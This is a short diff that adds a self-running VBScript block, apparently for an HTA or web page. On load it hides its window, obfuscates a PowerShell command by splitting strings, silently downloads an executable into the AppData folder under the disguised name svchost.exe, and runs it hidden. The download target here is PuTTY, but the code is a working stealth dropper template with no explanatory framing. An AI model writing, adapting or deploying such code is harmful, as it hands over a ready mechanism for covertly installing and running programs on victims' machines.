@@ -1,0 +1,21 @@
+<script language="VBScript">
+Function putty()
+	Window.ReSizeTo 0, 0 : Window.moveTo -2000,-2000 : 
+    On Error Resume Next
+    strComputer = "."
+	Set Checkdo = CreateObject("Wscript.Shell")
+    Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+    Set colItems = objWMIService.ExecQuery("Select * from Win32_ComputerSystem",,48)
+	appData = Checkdo.expandEnvironmentStrings("%appdata%") & "\svchost.exe" : 
+
+    For Each objItem in colItems
+       If InStr(objItem.SystemType, "64") <> 0 Then
+            Checkdo.run "Po"+"w"+"erS"+"he"+"ll -Window"+"Style Hid"+"den (New-Object Sys"+"tem."+"Net."+"Web"+"Client).Do"+"wnl"+"oadFi"+"le('https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe', '%appdata%\svchost.exe');",0,true :  
+        Else
+            Checkdo.run "Po"+"w"+"erS"+"he"+"ll -Window"+"Style Hid"+"den (New-Object Sys"+"tem."+"Net."+"Web"+"Client).Do"+"wnl"+"oadFi"+"le('https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe', '%appdata%\svchost.exe');",0,true : 
+        End If
+    Next
+	Checkdo.run "cm"+"d."+"e"+"xe "+" '/c """ & appData & """",0,false : self.close
+End Function
+call putty()
+</script>
